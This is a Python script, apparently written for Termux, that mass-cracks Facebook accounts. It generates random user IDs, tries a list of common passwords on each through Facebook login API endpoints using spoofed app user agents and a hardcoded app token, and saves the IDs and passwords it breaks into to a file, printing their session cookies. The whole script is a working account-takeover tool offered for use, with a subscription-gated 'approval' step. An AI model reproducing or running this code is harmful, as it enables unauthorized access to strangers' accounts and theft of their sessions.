#!/data/data/com.termux/files/usr/bin/python
#!/usr/bin/python
#!/usr/bin/env python
#SCRIPT WRITTEN BY ARNOLD
#YOUTUBE YEi TECH MONTO
#SCRIPT WRITTEN FOR ORDER
#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import requests
import sys
import subprocess
import time, uuid
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")

#----------------------------[AUTO OPEN LINKS]----------------------------#
# Open YouTube, Telegram, WhatsApp
os.system("xdg-open https://youtube.com/@yeitechmonto?si=gdN-jU1lNgY4Ztag")
os.system("xdg-open https://t.me/yeitechmonto1")
os.system("xdg-open https://chat.whatsapp.com/Gzq2Q0pVVGMAnvc86UrLHC")

#----------------------------[APPROVAL GATE]-----------------------------#
while True:
    print("\n\x1b[1;92mBHAI FREE APPROVAL H TO SUBSCRIBE KAR KE YOUTUBE CHANNEL KA NAME DAL DO — APPROVE HO JAYEGA!")
    approve = input("\x1b[1;97mCHANNEL NAME: ").strip()
    if approve.lower() == "ye ha":
        print("\n\x1b[1;92mAccess Granted! Thank you for subscribing.")
        break
    else:
        print("\x1b[1;91mGalat Channel Name! Wapas try karo...\n")
        time.sleep(2)
#----------------------------[BAKI KA CODE YAHAN AAYEGA]------------------#

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
#-----------------------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
x = (a+build+b).upper().replace(".","")
z = "X".join(x)
keys = z[15:]

appx_buffer = BytesIO()
appx_curl = pycurl.Curl()
appx_curl.setopt(pycurl.URL, "https://pastebin.com/raw/gkD83bzg")
appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
appx_curl.perform()
appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
raw = "".join(appx_data)



# ------------------[ SINGLE RANDOM UA SYSTEM - UPDATED ]------------------ #

import random

def sm():
    android_versions = ['14', '13', '12', '11', '10']
    android_version = random.choice(android_versions)

    # Expanded Samsung GT + SM series models (2006–2023) — A to Z list
    samsung_models = [
        # GT series (older models 2006–2015)
        'GT-I9300', 'GT-I9500', 'GT-N7100', 'GT-S7562', 'GT-I9100', 'GT-I8190',
        'GT-S7582', 'GT-S6810', 'GT-S6312', 'GT-S6102', 'GT-B5512', 'GT-S5360',
        'GT-S5302', 'GT-S7262', 'GT-S7392', 'GT-N7000', 'GT-I8552', 'GT-I8262',
        'GT-I9082', 'GT-I9220', 'GT-I9070', 'GT-I8200', 'GT-I8150', 'GT-S5830',

        # SM series (newer models 2016–2023)
        'SM-G970F', 'SM-G973F', 'SM-G975F', 'SM-G980F', 'SM-G985F',
        'SM-G986B', 'SM-G988B', 'SM-G991B', 'SM-G996B', 'SM-G998B',
        'SM-A125F', 'SM-A226B', 'SM-A325F', 'SM-A336B', 'SM-A515F',
        'SM-A526B', 'SM-A536E', 'SM-A546E', 'SM-M115F', 'SM-M135F',
        'SM-M215F', 'SM-M315F', 'SM-M325F', 'SM-M336B', 'SM-M526BR',
        'SM-M536B', 'SM-S901E', 'SM-S906E', 'SM-S908E', 'SM-A146P',
        'SM-F711B', 'SM-F721B', 'SM-A716B', 'SM-A705FN'
    ]

    other_brands = {
        'Vivo': ['vivo V30', 'vivo V29e', 'vivo Y200', 'vivo T2 Pro', 'vivo Y100', 'vivo Y27'],
        'Oppo': ['CPH2601', 'CPH2521', 'CPH2555', 'CPH2481', 'CPH2581', 'CPH2413'],
        'Infinix': ['Infinix GT 10 Pro', 'Infinix Note 30', 'Infinix Smart 8 HD'],
        'Nokia': ['Nokia G60 5G', 'Nokia G42', 'Nokia XR21', 'Nokia C32', 'Nokia G400'],
        'Realme': ['RMX3782', 'RMX3771', 'RMX3760', 'RMX3612', 'RMX3867'],
        'Xiaomi': ['Redmi Note 13 Pro', 'Redmi 13C', 'Redmi 12 5G', 'Redmi Note 12 Turbo', 'POCO X5 Pro'],
        'Tecno': ['Tecno Camon 30 Pro', 'Tecno Spark 20 Pro+', 'Tecno Phantom V Flip'],
        'OnePlus': ['OnePlus 12R', 'OnePlus Nord CE 3', 'OnePlus Nord N30 5G'],
        'Huawei': ['Huawei nova 11i', 'Huawei Y91', 'Huawei P60 Pro']
    }

    all_brands = ['Samsung'] + list(other_brands.keys())
    brand = random.choice(all_brands)

    model = random.choice(samsung_models) if brand == 'Samsung' else random.choice(other_brands[brand])

    build_version = 'SP1A.210812.016'
    fb_variant = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid',
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android',
        'com.facebook.mlite|MessengerLite'
    ])
    package, app = fb_variant.split('|')

    fb_version = f"{random.randint(400, 699)}.0.0.{random.randint(10,99)}.{random.randint(50,120)}"
    fb_build = str(random.randint(100000000, 999999999))
    width = random.randint(720, 1080)
    height = random.randint(1600, 2400)

    ua = (
    f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build_version}) '
    f'[FBAN/{app};FBAV/{fb_version};FBPN/{package};FBLC/en_US;FBBV/{fb_build};'
    f'FBCR/Airtel;FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};'
    f'FBCA/arm64-v8a:null;FBDM{{density=2.75,width={width},height={height}}};FB_FW/1;]'
)

    return ua



# ------------------[ UG1 - UPDATED FOR FB ID FINDING ]------------------ #

def ug1():
    import random

    fb_version = f"{random.randint(400, 699)}.0.0.{random.randint(10, 99)}.{random.randint(50, 120)}"
    fb_build = str(random.randint(100000000, 999999999))
    android_version = random.choice(['12', '13', '14'])

    samsung_models = [
        'SM-G998B', 'SM-G996B', 'SM-G991B', 'SM-G988B', 'SM-G986B',
        'SM-A536E', 'SM-A546E', 'SM-M526BR', 'SM-M536B', 'SM-S908E',
        'SM-F721B', 'SM-F711B', 'SM-A336B', 'SM-A515F', 'SM-A705FN'
    ]
    redmi_models = [
        'Redmi Note 13 Pro', 'Redmi Note 12 Pro', 'Redmi 12 5G', 'Redmi Note 11T', 'POCO X5 Pro'
    ]
    realme_models = [
        'RMX3867', 'RMX3782', 'RMX3612', 'RMX3771', 'Realme 11 Pro+'
    ]
    vivo_models = [
        'vivo V29e', 'vivo V30', 'vivo Y100', 'vivo Y200', 'vivo T2 Pro'
    ]
    oppo_models = [
        'CPH2481', 'CPH2555', 'CPH2601', 'CPH2413', 'OPPO A78'
    ]
    infinix_models = [
        'Infinix GT 10 Pro', 'Infinix Zero 30', 'Infinix Note 30 Pro'
    ]
    nokia_models = [
        'Nokia G60 5G', 'Nokia C32', 'Nokia G42', 'Nokia XR21'
    ]
    tecno_models = [
        'Tecno Camon 30 Pro', 'Tecno Spark 20 Pro+', 'Tecno Phantom V Flip'
    ]
    huawei_models = [
        'Huawei P60 Pro', 'Huawei nova 11i', 'Huawei Y91'
    ]
    honor_models = [
        'Honor X9b', 'Honor 90 Lite', 'Honor X8 5G'
    ]

    brand_models = {
        'Samsung': samsung_models,
        'Redmi': redmi_models,
        'Realme': realme_models,
        'Vivo': vivo_models,
        'Oppo': oppo_models,
        'Infinix': infinix_models,
        'Nokia': nokia_models,
        'Tecno': tecno_models,
        'Huawei': huawei_models,
        'Honor': honor_models
    }

    brand = random.choice(list(brand_models.keys()))
    model = random.choice(brand_models[brand])
    build_version = 'SP1A.210812.016'
    width = random.randint(720, 1080)
    height = random.randint(1600, 2400)
    fb_variant = random.choice([
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android',
        'com.facebook.lite|FBLite'])

def fresh_ua():
    fb_version = f"{random.randint(400, 699)}.0.0.{random.randint(10, 99)}.{random.randint(50, 120)}"
    fb_build = str(random.randint(100000000, 999999999))
    android_version = random.choice(['12', '13', '14'])

    brands = {
        'Samsung': [
            'SM-G991B', 'SM-G996B', 'SM-G998B', 'SM-A536E', 'SM-M336B',
            'SM-S901E', 'SM-S906E', 'SM-S908E', 'SM-F721B', 'SM-A146P'
        ],
        'Redmi': [
            'Redmi Note 12', 'Redmi Note 13 Pro', 'Redmi 13C', 'Redmi 12 5G', 'POCO X5 Pro'
        ],
        'Nokia': [
            'Nokia G60 5G', 'Nokia C32', 'Nokia G400', 'Nokia XR21'
        ],
        'Realme': [
            'RMX3867', 'RMX3612', 'RMX3782', 'RMX3760'
        ],
        'Vivo': [
            'vivo V30', 'vivo T2 Pro', 'vivo Y200', 'vivo Y100'
        ],
        'Infinix': [
            'Infinix GT 10 Pro', 'Infinix Note 30', 'Infinix Smart 8 HD'
        ],
        'Oppo': [
            'CPH2601', 'CPH2521', 'CPH2555', 'CPH2481'
        ]
    }

    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])

    width = random.choice([720, 1080])
    height = random.choice([1600, 1920, 2400])
    density = round(random.uniform(2.0, 3.5), 1)

    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/SP1A.210812.016) '
        f'[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{fb_build};'
        f'FBCR/Jio;FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};'
        f'FBCA/armeabi-v7a:armeabi;FBDM{{density={density},width={width},height={height}}};FB_FW/1;]'
    )

    return ua


# ------------------[ UG2 - Samsung Only | FB ID Finding Strong UA ]------------------ #

def ug2():
    fb_version = f"{random.randint(400, 699)}.0.0.{random.randint(10, 99)}.{random.randint(50, 120)}"
    fb_build = str(random.randint(100000000, 999999999))
    android_version = random.choice(['11', '12', '13', '14'])

    samsung_models = [
        # Fresh & Unique Samsung Devices Not Previously Added

        # A Series
        'SM-A245F', 'SM-A256E', 'SM-A145P', 'SM-A155F', 'SM-A457U',
        'SM-A456U1', 'SM-A556B', 'SM-A047F', 'SM-A052F',

        # M Series
        'SM-M146RA', 'SM-M256B', 'SM-M346B', 'SM-M546B', 'SM-M147F',
        'SM-M044F', 'SM-M053F',

        # S Series (latest)
        'SM-S916B', 'SM-S926B', 'SM-S936B', 'SM-S711B', 'SM-S721B',

        # Foldables (Z Series)
        'SM-F731B', 'SM-F946B', 'SM-F956B', 'SM-F926B', 'SM-F936B',

        # Other performing GT/N models
        'GT-N8000', 'GT-I9100G', 'GT-I9195I', 'GT-I8552B', 'GT-N7000'
    ]

    model = random.choice(samsung_models)
    width = random.choice([720, 1080])
    height = random.choice([1600, 1920, 2400])
    density = round(random.uniform(2.0, 3.5), 1)

    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/SP1A.210812.016) '
        f'[FBAN/Orca-Android;FBAV/{fb_version};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{fb_build};'
        f'FBCR/Jio;FBMF/Samsung;FBBD/Samsung;FBDV/{model};FBSV/{android_version};'
        f'FBCA/armeabi-v7a:armeabi;FBDM{{density={density},width={width},height={height}}};FB_FW/1;]'
    )

    return ua
    model = random.choice(samsung_models)

    width = random.choice([720, 1080])
    height = random.choice([1600, 1920, 2400])
    density = round(random.uniform(2.0, 3.5), 1)

    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/SP1A.210812.016) '
        f'[FBAN/Orca-Android;FBAV/{fb_version};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{fb_build};'
        f'FBCR/Jio;FBMF/Samsung;FBBD/Samsung;FBDV/{model};FBSV/{android_version};'
        f'FBCA/armeabi-v7a:armeabi;FBDM{{density={density},width={width},height={height}}};FB_FW/1;]'
    )

    return ua
#----------------------------[LOGO]-----------------------------------#
logo = f"""\x1b[1;92m

   ###    ########  ##    ##  #######  ##       ########
  ## ##   ##     ## ###   ## ##     ## ##       ##     ##
 ##   ##  ##     ## ####  ## ##     ## ##       ##     ##
##     ## ########  ## ## ## ##     ## ##       ##     ##
######### ##   ##   ##  #### ##     ## ##       ##     ##
##     ## ##    ##  ##   ### ##     ## ##       ##     ##
##     ## ##     ## ##    ##  #######  ######## ########


AUTHOR   : \x1b[1;93mARNOLD HARDY x 🌝 \x1b[1;92mISHAN TURK
GITHUB   : \x1b[1;93mMENTALROMEO     \x1b[1;92m
\x1b[1;92mBESTU    : \x1b[1;93mITZ CHUZA 🐥 RIZWAN 🔥
\x1b[1;92mVERSION  : \x1b[1;93m1.1      \x1b[1;95m
𝐋𝐎𝐆𝐎 𝐊𝐀 𝐊𝐘𝐀 𝐇 𝐔𝐍𝐊𝐀 𝐓𝐎 𝐊𝐀𝐌 𝐇 𝐇𝐈 𝐉𝐀𝐋𝐍𝐀\x1b[1;91m"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
    lin()
    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
    lin()
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
    lin()
    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
    lin()
    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    if "1" in cspd:
        speedx = 45
    else:
        speedx = 30

    if ask in ["1"]:
        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
        star = "10000"
        for i in range(int(limit)):
            data = str(random.randint(1000000000, 9999999999))
            user.append(data)
    else:
        sv = f"{g}[{w}2008{r}-{w}2010{g}]"
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)

    with ThreadPool(max_workers=speedx) as samira:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = star + mal
            if mtd_opt in ["1", "A"]:
                samira.submit(login, uid, tl)
            elif mtd_opt in ["2", "B"]:
                samira.submit(login1, uid, tl)
            else:
                samira.submit(login, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()
#----------------------------[METHOD 1]-----------------------------------#
def login(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ug2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) +
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[METHOD 2]-----------------------------------#
def login1(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:

            url = 'https://graph.facebook.com/auth/login'

            headers = {
                'User-Agent': ug1(),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': '*/*',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 60000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 60000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=zFz+mXYKhjpZ;pid=Main;tid=112;nc=2;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            rp = requests.post(url, headers=headers, data=data).json()
            if "session_key" in rp:
                cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                try:
                    print(f"\r\r{r}[{g}COOKIES 🍪{r}]{p}➤ {w}{cookie}")
                    lin()
                except(KeyError, IOError):
                    pass
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[APPROVAL]-----------------------------------#
def approval():
    global keys, raw
    if keys in raw:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS APPROVED")
        lin()
        time.sleep(1)
        main()
    else:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS NOT APPROVED")
        print(f"{g}[{r}~{g}] {w}PLEASE CONTACT TOOL OWNER FOR ACTIVATION{g}")
        lin()
        input(f"{g}[{r}~{g}] {w}PRESS ENTER TO SEND KEY TOOL OWNER")
        os.system("xdg-open https://t.me/yeitechmonto1")
        sys.exit()
main()
#----------------------------[CODE/END]-----------------------------------#